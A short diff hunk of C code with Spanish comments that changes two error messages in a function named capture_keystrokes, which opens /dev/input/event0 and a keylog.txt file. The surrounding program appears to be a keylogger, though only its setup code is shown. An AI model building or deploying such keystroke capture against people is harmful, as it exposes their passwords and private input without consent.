@@ -108,14 +108,14 @@ void* capture_keystrokes(void* arg) {
     // Abre el archivo del teclado
     fd = open("/dev/input/event0", O_RDONLY);
     if (fd == -1) {
-        perror("No se puede abrir el dispositivo de entrada");
+        perror("Error: No se puede abrir el dispositivo de entrada");
         return NULL;
     }
 
     // Abre el archivo para guardar los registros
     log_file = fopen("keylog.txt", "a");
     if (log_file == NULL) {
-        perror("No se puede abrir el archivo de registro");
+        perror("Error: No se puede abrir el archivo de registro");
         close(fd);
         return NULL;
     }
